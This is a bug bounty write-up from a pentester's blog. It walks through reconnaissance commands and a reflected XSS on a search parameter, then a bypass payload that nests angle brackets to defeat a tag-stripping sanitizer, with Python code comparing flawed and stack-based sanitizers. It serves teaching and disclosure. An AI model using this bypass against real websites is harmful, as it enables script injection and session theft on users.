<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Reflected XSS bypassing HTML tag removal sanitization - hackcommander.io</title>
<meta name="description" content="Partial disclosure of a bug bounty report: reflected XSS bypassing HTML tag removal sanitization.">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="hackcommander.io">
<meta property="og:title" content="Reflected XSS bypassing HTML tag removal sanitization">
<meta property="og:url" content="https://hackcommander.io/bug-bounty-1/">


  <meta property="og:description" content="Partial disclosure of a bug bounty report: reflected XSS bypassing HTML tag removal sanitization.">



  <meta property="og:image" content="https://hackcommander.io/assets/images/general/bug-bounty.png">





  <meta property="article:published_time" content="2022-09-20T00:00:00+02:00">





  

  


<link rel="canonical" href="https://hackcommander.io/bug-bounty-1/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "HackCommander",
      "url": "https://hackcommander.io",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

    
  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/">Home</a>
            </li>
<li class="masthead__menu-item">
              <a href="/year-archive/">Posts</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories/">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags/">Tags</a>
            </li>
<li class="masthead__menu-item">
              <a href="/about/">About</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="https://hackcommander.io/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1">
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">Reflected XSS bypassing HTML tag removal sanitization</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">HackCommander</h3>
    
    
      <p class="author__bio" itemprop="description">
        Pentester / Bug Bounty Hunter / CTF Player / eJPT
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
        </li>
      

      

      

      
        <li>
          <a href="mailto:ivansantosmalpica.contact@gmail.com">
            <meta itemprop="email" content="ivansantosmalpica.contact@gmail.com">
            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i> Email
          </a>
        </li>
      

      

      
        <li>
          <a href="https://twitter.com/H4ckC0mm4nd3r" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter
          </a>
        </li>
      

      

      

      
        <li>
          <a href="https://www.linkedin.com/in/%E2%98%91iv%C3%A1n-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
          </a>
        </li>
      

      

      

      

      

      
        <li>
          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Reflected XSS bypassing HTML tag removal sanitization">
    <meta itemprop="description" content="Partial disclosure of a bug bounty report: reflected XSS bypassing HTML tag removal sanitization.">
    <meta itemprop="datePublished" content="September 20, 2022">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Reflected XSS bypassing HTML tag removal sanitization
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-09-20T00:00:00+02:00">September 20, 2022 </time> 
          
          
        </p>
        <h2 id="summary">Summary</h2>

<ul>
  <li><a href="#section-id-1">1. Asset discovery</a></li>
  <li><a href="#section-id-2">2. Vulnerability discovery</a></li>
  <li>
<a href="#section-id-3">3. Vulnerability exploitation</a>
    <ul>
      <li><a href="#section-id-3-1">3.1. Steps of exploitation</a></li>
      <li>
<a href="#section-id-3-2">3.2. Why does the payload work?</a>
        <ul>
          <li><a href="#section-id-3-2-1">3.2.1. Sanitization algorithm based on a boolean variable</a></li>
          <li><a href="#section-id-3-2-2">3.2.2. Sanitization algorithm based on a data structure</a></li>
          <li><a href="#section-id-3-2-3">3.2.3. Code of the algorithms</a></li>
        </ul>
      </li>
    </ul>
  </li>
  <li><a href="#section-id-4">4. Report resolution</a></li>
  <li><a href="#section-id-5">5. Lessons learned</a></li>
</ul>

<p><img src="/assets/images/general/bug-bounty.png" alt=""></p>

<blockquote>
  <p><img class="emoji" title=":warning:" alt=":warning:" src="https://github.githubassets.com/images/icons/emoji/unicode/26a0.png" height="20" width="20"> <span style="color:red">This bug was reported in a private bug bounty program in which it is not allowed to publish the vulnerabilities found. So this is a partial disclosure, only the essential technical details are exposed.</span></p>
</blockquote>

<p>In this post I am going to show my first relevant report in a bug bounty program: a reflected XSS bypassing HTML tag removal sanitization. This was not my first report but it was the first one where using pentesting tools was not enough and I had to think outside the box.</p>

<div id="section-id-1"></div>

<h2 id="1-asset-discovery">1. Asset discovery</h2>

<p>I found this asset through amass + httpx. If you are looking for http services on subdomains of the domain example.com and you have your config file in the path /home/user/.config/amass/config.ini, you can use the following command</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">amass enum -brute -d example.com '/home/user/.config/amass/config.ini' | httpx -title -tech-detect -status-code -ip -p 66,80,81,443,445,457,1080,1100,1241,1352,1433,1434,1521,1944,2301,3000,3128,3306,4000,4001,4002,4100,5000,5432,5800,5801,5802,6082,6346,6347,7001,7002,8080,8443,8888,30821
</span></code></pre></div></div>

<p><a href="https://github.com/OWASP/Amass">Amass</a> is an OSINT tool to perform network mapping of attack surfaces and external asset discovery which is a very famous tool used in the recon step in bug bounty. The output of the above amass command is a list of subdomains of the given domain, i.e, a list of potential targets.</p>

<p><a href="https://github.com/projectdiscovery/httpx">Httpx</a> is a multi-purpose HTTP toolkit allow to run multiple probers. In this case, the input of httpx is a list of subdomains and the output is a list of subdomains that have an http service in any of the ports given as a parameter. Also it shows some additional information about the service such as the title, the detected technologies… that I have specified in the parameters to be displayed.</p>

<div id="section-id-2"></div>

<h2 id="2-vulnerability-discovery">2. Vulnerability discovery</h2>

<p>I found this vulnerability through gau + kxss. If you are looking for XSS in the subdomain www.example.com, you can use the following command</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">gau www.example.com | kxss
</span></code></pre></div></div>

<p><a href="https://github.com/lc/gau">Gau</a> is a tool used to fetch known URLs from AlienVault’s Open Threat Exchange, the Wayback Machine, Common Crawl, and URLScan for any given domain. This tool does not always find all the URLs of a domain but it is a good starting point to search XSS or other types of vulnerabilities.</p>

<p><a href="https://github.com/Emoe/kxss">Kxss</a> is a tool used to find all the “problematic characters” that are reflected in the response of any URL given as a parameter. The reflection of some problematic characters does not mean that an XSS exists but it is an indication that it could exist.</p>

<p>Both tools are based in other tools of <a href="https://github.com/tomnomnom">tomnomnom</a>.</p>

<p>In this case I got an output like the following</p>

<p><img src="/assets/images/2022-09-20-bug-bounty-1/gau-kxss-output.png" alt=""></p>

<p>The vulnerable parameter was the typical parameter used to make queries on a website, which usually reflects the word used as a search parameter.</p>

<div id="section-id-3"></div>

<h2 id="3-vulnerability-exploitation">3. Vulnerability exploitation</h2>

<div id="section-id-3-1"></div>

<h2 id="31-steps-of-exploitation">3.1. Steps of exploitation</h2>

<p>Unfortunately I don’t have any screenshot of the exploitation of this XSS except the screenshot that shows the execution of the XSS, and the vulnerability is already patched. I don’t have the Burpsuite screenshot either because at that time I wasn’t even using Burpsuite, I was just starting in pentesting and playing with the website functionalities. Therefore the tool I used to test the XSS was the dev tools of the browser. I know, it’s crazy <img class="emoji" title=":laughing:" alt=":laughing:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f606.png" height="20" width="20"></p>

<p>Suppose that the URL returned by gau + kxss is as follows</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.example.com/?vuln-param=bugbountytest1
</code></pre></div></div>

<p>where vuln-param is the vulnerable param to XSS.</p>

<p>The parameter was reflected in several places but the problematic characters was reflected only in one of them: in the content attribute of a meta tag. So the response of the above request contained the following HTML code</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"title"</span> <span class="na">content=</span><span class="s">"Resultados asociados a la palabra: 'bugbountytest1'"</span><span class="nt">/&gt;</span>
</code></pre></div></div>

<p>I was looking at Stack Overflow and I found that the XSS inside the content attribute of a meta tag is highly dependent of the used browser as you can see in the following link</p>

<p><a href="https://stackoverflow.com/questions/18947139/xss-in-meta-tag">Post in Stack Overflow talking about XSS in meta tag</a></p>

<p>so I tried to break the attribute assignment through a request of the form</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.example.com/?vuln-param=bugbountytest1'"&gt;bugbountytest2
</code></pre></div></div>

<p>and the response contained the following HTML code</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"title"</span> <span class="na">content=</span><span class="s">"Resultados asociados a la palabra: 'bugbountytest1'"</span><span class="nt">&gt;</span>
bugbountytest2
</code></pre></div></div>

<p>So far so good. Then I tried to inject some javascript code through a request of the form</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.example.com/?vuln-param=bugbountytest1'"&gt;<span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p>and the response contained the following HTML code</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"title"</span> <span class="na">content=</span><span class="s">"Resultados asociados a la palabra: 'bugbountytest1'"</span><span class="nt">&gt;</span>
alert(1)
</code></pre></div></div>

<p>so it looks like the backend is applying a sanitization.</p>

<p>Is it a keyword sanitization based or it removes all the input strings between the &lt; and &gt; characters?</p>

<p>To answer the above question I sent a request of the form</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.example.com/?vuln-param=bugbountytest1'"&gt;<span class="nt">&lt;bugbountytest2&gt;</span>
</code></pre></div></div>

<p>and the response contained the following HTML code</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"title"</span> <span class="na">content=</span><span class="s">"Resultados asociados a la palabra: 'bugbountytest1'"</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p>so the sanitization removes all the content between the &lt; and &gt; characters, both characters included, and not only the content that matches with some keywords. After that I wondered if nesting the &lt; and &gt; characters would give a different result so I sent several requests nesting the &lt; and &gt; characters but the most revealing of all was</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.example.com/?vuln-param=bugbountytest1'"&gt;<span class="nt">&lt;</span><span class="err">&lt;</span><span class="nt">&gt;</span>bugbountytest2&gt;
</code></pre></div></div>

<p>whose response contained the following HTML code</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"title"</span> <span class="na">content=</span><span class="s">"Resultados asociados a la palabra: 'bugbountytest1'"</span><span class="nt">&gt;</span>
<span class="nt">&lt;bugbountytest2&gt;</span>
</code></pre></div></div>

<p>This result yields a very clear way of injecting javascript code in the response using the following request</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.example.com/?vuln-param=bugbountytest1'"&gt;<span class="nt">&lt;</span><span class="err">&lt;</span><span class="nt">&gt;</span>script&gt;alert(1)<span class="nt">&lt;</span><span class="err">&lt;</span><span class="nt">&gt;</span>/script&gt;
</code></pre></div></div>

<p>The response contained the following HTML code</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"title"</span> <span class="na">content=</span><span class="s">"Resultados asociados a la palabra: 'bugbountytest1'"</span><span class="nt">&gt;</span>
<span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p>and the reflected XSS was reproduced as you can see in the following screenshot</p>

<p><img src="/assets/images/2022-09-20-bug-bounty-1/xss-alert.png" alt=""></p>

<div id="section-id-3-2"></div>

<h2 id="32-why-does-the-payload-work">3.2. Why does the payload work?</h2>

<p>After exploiting the reflected XSS, I wondered what kind of sanitization algorithm could lead to the above behavior. I am not a professional programmer but I have some scripting knowledge so I know that there could be different algorithms to try to achieve the above sanitization, some of them unsafe.</p>

<div id="section-id-3-2-1"></div>

<h3 id="321-sanitization-algorithm-based-on-a-boolean-variable">3.2.1. Sanitization algorithm based on a boolean variable</h3>

<p>An insecure algorithm to try to achieve the above sanitization is to use a boolean variable to keep track of whether a &lt; character has been encountered or not. This variable will be set to true when a &lt; character has been encountered and false when no &lt; character has been encountered or when a &gt; character has been encountered that closes a &lt; character. When the variable changes from true to false the algorithm removes all the content between the &lt; and &gt; characters, including both.</p>

<p>The flaw of this algorithm is that it does not take into account that &lt; and &gt; characters can be nested, so the boolean variable will be true whether 1 or 10000 &lt; characters are encountered and a single &gt; will be enough to set the variable to false, even if there are other &lt; characters without closing. This is a <strong>sanitization algorithm based on a boolean variable</strong>.</p>

<div id="section-id-3-2-2"></div>

<h3 id="322-sanitization-algorithm-based-on-a-data-structure">3.2.2. Sanitization algorithm based on a data structure</h3>

<p>One way to avoid this flaw is to use a data structure to keep track of all unclosed &lt; characters. The most suitable data structure for this task is a <strong>stack</strong> . The most suitable data structure to perform this task is a <strong>stack</strong> since the sanitization will be performed from the last &lt; character encountered (the one at the head of the stack) to the current &gt; character. This is a <strong>sanitization algorithm based on a data structure</strong>.</p>

<div id="section-id-3-2-3"></div>

<h3 id="323-code-of-the-algorithms">3.2.3. Code of the algorithms</h3>

<p>The backend was designed in PHP but I have implemented both algorithms in python to show in practice what I mean by both algorithms</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Return the result of removing from input the substring between the characters in positions i and j
</span><span class="k">def</span> <span class="nf">remove_substring</span><span class="p">(</span><span class="nb">input</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">):</span>
    <span class="k">return</span> <span class="nb">input</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="nb">input</span><span class="p">[</span><span class="n">j</span><span class="o">+</span><span class="mi">1</span><span class="p">:</span><span class="nb">len</span><span class="p">(</span><span class="nb">input</span><span class="p">)]</span>

<span class="c1"># Get the sanitization of the input using an algorithm based on a boolean variable
</span><span class="k">def</span> <span class="nf">get_boolean_variable_based_sanitization</span><span class="p">(</span><span class="nb">input</span><span class="p">):</span>
    <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span> <span class="c1"># Index of the input string
</span>    <span class="n">less_than_char_index</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> <span class="c1"># Index of the last &lt; found
</span>    <span class="n">less_than_char_found</span> <span class="o">=</span> <span class="bp">False</span> <span class="c1"># Variable that controls if &lt; was found before
</span>    <span class="k">while</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="nb">input</span><span class="p">):</span>
        <span class="k">if</span> <span class="nb">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s">'&gt;'</span> <span class="ow">and</span> <span class="n">less_than_char_found</span><span class="p">:</span> <span class="c1"># If the current character is &gt; and &lt; was found before
</span>            <span class="n">less_than_char_found</span> <span class="o">=</span> <span class="bp">False</span>
            <span class="nb">input</span> <span class="o">=</span> <span class="n">remove_substring</span><span class="p">(</span><span class="nb">input</span><span class="p">,</span> <span class="n">less_than_char_index</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
            <span class="n">i</span> <span class="o">=</span> <span class="n">less_than_char_index</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">if</span> <span class="nb">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s">'&lt;'</span><span class="p">:</span> <span class="c1"># If the current character is &lt;
</span>                <span class="n">less_than_char_found</span> <span class="o">=</span> <span class="bp">True</span>
                <span class="n">less_than_char_index</span> <span class="o">=</span> <span class="n">i</span>
            <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">return</span> <span class="nb">input</span>

<span class="c1"># Get the sanitization of the input using an algorithm based on a data structure
</span><span class="k">def</span> <span class="nf">get_data_structure_based_sanitization</span><span class="p">(</span><span class="nb">input</span><span class="p">):</span>
    <span class="kn">from</span> <span class="nn">queue</span> <span class="kn">import</span> <span class="n">LifoQueue</span>
    <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span> <span class="c1"># Index of the input string
</span>    <span class="n">less_than_char_stack</span> <span class="o">=</span> <span class="n">LifoQueue</span><span class="p">()</span> <span class="c1"># Stack that keeps track of all &lt; encountered
</span>    <span class="k">while</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="nb">input</span><span class="p">):</span>
        <span class="k">if</span> <span class="nb">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s">'&gt;'</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">less_than_char_stack</span><span class="p">.</span><span class="n">empty</span><span class="p">():</span> <span class="c1"># If the current character is &gt; and &lt; was found before
</span>            <span class="n">less_than_char_index</span> <span class="o">=</span> <span class="n">less_than_char_stack</span><span class="p">.</span><span class="n">get</span><span class="p">()</span>
            <span class="nb">input</span> <span class="o">=</span> <span class="n">remove_substring</span><span class="p">(</span><span class="nb">input</span><span class="p">,</span> <span class="n">less_than_char_index</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
            <span class="n">i</span> <span class="o">=</span> <span class="n">less_than_char_index</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">if</span> <span class="nb">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s">'&lt;'</span><span class="p">:</span> <span class="c1"># If the current character is &lt;
</span>                <span class="n">less_than_char_stack</span><span class="p">.</span><span class="n">put</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
            <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">return</span> <span class="nb">input</span>

<span class="c1"># Main code to test both algorithms
</span><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="c1"># List of inputs
</span>    <span class="n">input_list</span> <span class="o">=</span> <span class="p">[</span><span class="sa">r</span><span class="s">"""bugbountytest1"""</span><span class="p">,</span> <span class="sa">r</span><span class="s">"""bugbountytest1'"&gt;bugbountytest2"""</span><span class="p">,</span>
                  <span class="sa">r</span><span class="s">"""bugbountytest1'"&gt;&lt;script&gt;alert(1)&lt;/script&gt;"""</span><span class="p">,</span><span class="sa">r</span><span class="s">"""bugbountytest1'"&gt;&lt;bugbountytest2&gt;"""</span><span class="p">,</span>
                  <span class="sa">r</span><span class="s">"""bugbountytest1'"&gt;&lt;&lt;&gt;bugbountytest2&gt;"""</span><span class="p">,</span><span class="sa">r</span><span class="s">"""bugbountytest1'"&gt;&lt;&lt;&gt;script&gt;alert(1)&lt;&lt;&gt;/script&gt;"""</span><span class="p">]</span>

    <span class="c1"># Execute the sanitizations for all the inputs
</span>    <span class="n">output</span> <span class="o">=</span> <span class="s">''</span>
    <span class="k">for</span> <span class="nb">input</span> <span class="ow">in</span> <span class="n">input_list</span><span class="p">:</span>
        <span class="c1"># Apply the sanitizations
</span>        <span class="n">boolean_variable_based_sanitization</span> <span class="o">=</span> <span class="n">get_boolean_variable_based_sanitization</span><span class="p">(</span><span class="nb">input</span><span class="p">)</span>
        <span class="n">data_structure_based_sanitization</span> <span class="o">=</span> <span class="n">get_data_structure_based_sanitization</span><span class="p">(</span><span class="nb">input</span><span class="p">)</span>
        <span class="c1"># Store the output of the sanitizations
</span>        <span class="n">output</span> <span class="o">=</span> <span class="n">output</span> <span class="o">+</span> <span class="s">"Input  -&gt;  "</span> <span class="o">+</span> <span class="nb">input</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
        <span class="n">output</span> <span class="o">=</span> <span class="n">output</span> <span class="o">+</span> <span class="s">"Boolean variable based sanitization  -&gt;  "</span> <span class="o">+</span> <span class="n">boolean_variable_based_sanitization</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
        <span class="n">output</span> <span class="o">=</span> <span class="n">output</span> <span class="o">+</span> <span class="s">"Data structure based sanitization  -&gt;  "</span> <span class="o">+</span> <span class="n">data_structure_based_sanitization</span> <span class="o">+</span> <span class="mi">2</span><span class="o">*</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span>

    <span class="c1"># Print the results
</span>    <span class="k">print</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
</code></pre></div></div>

<p>As you can see, the 2 algorithms are very similar because they only differ in the type of variable used to keep track of whether there is any &lt; unclosed character or not. If you put the above code in a main.py and you execute it with Python3, you will see the following output</p>

<p><img src="/assets/images/2022-09-20-bug-bounty-1/script-output.png" alt=""></p>

<p>It is easy to see that the first three inputs yield the same sanitization but the fourth and fifth, which is precisely where the &lt; and &gt; characters are nested, the sanitizations are different.</p>

<p>I don’t know if the backend was using the boolean variable based sanitization algorithm because I didn’t have access to the backend code, but the behavior of the website sanitizations and the output of the script fit perfectly.</p>

<div id="section-id-4"></div>

<h2 id="4-report-resolution">4. Report resolution</h2>

<p>The subdomain is an e-commerce asset so they considered it an important asset of the company. An XSS usually is considered a medium severity vulnerability and because I wasn’t able to sign up and log in the website, I couldn’t demonstrate a high impact such as session hijacking. Therefore, the report was classified as</p>

<ul>
  <li>
<strong>Asset criticity</strong>: High</li>
  <li>
<strong>Vulnerability severity</strong>: Medium</li>
  <li>
<strong>Bounty</strong>: More than $200</li>
</ul>

<div id="section-id-5"></div>

<h2 id="5-lessons-learned">5. Lessons learned</h2>

<ul>
  <li>Gau and kxss are very useful tools for bug bounty. They are very easy to install and run and, in return, can give several URLs potentially vulnerable to XSS.</li>
  <li>Although a sanitization algorithm may seem safe at first, it may not be. Given a sanitization like the one we have seen in this post it is a good exercise to think about what algorithms you would have used to perform such sanitization because some of them may be the one being used on the website. If any of the algorithms you have thought of is vulnerable, the payloads to exploit these vulnerabilities are candidate payloads to use against the website.</li>
  <li>Bug bounty is not a CTF, is the jungle. Many times even if a vulnerability is present, you will have to fight with WAFs and sanitizations so you need to be prepared to think outside the box.</li>
</ul>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#amass" class="page__taxonomy-item" rel="tag">amass</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#bypass" class="page__taxonomy-item" rel="tag">bypass</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#gau" class="page__taxonomy-item" rel="tag">gau</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#httpx" class="page__taxonomy-item" rel="tag">httpx</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#kxss" class="page__taxonomy-item" rel="tag">kxss</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#osint" class="page__taxonomy-item" rel="tag">OSINT</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#python" class="page__taxonomy-item" rel="tag">python</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#sanitization" class="page__taxonomy-item" rel="tag">sanitization</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#web-pentesting" class="page__taxonomy-item" rel="tag">web pentesting</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#xss" class="page__taxonomy-item" rel="tag">XSS</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#bug-bounty" class="page__taxonomy-item" rel="tag">Bug Bounty</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2022-09-20T00:00:00+02:00">September 20, 2022</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/ejpt-certification-review/" class="pagination--pager" title="eJPT certification review
">Previous</a>
    
    
      <a href="/bug-bounty-2/" class="pagination--pager" title="Time-based SQL injection in a login form
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">© 2022 HackCommander</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>




<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-JGTZF7HYRM"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-JGTZF7HYRM');
</script>



  </body>
</html>
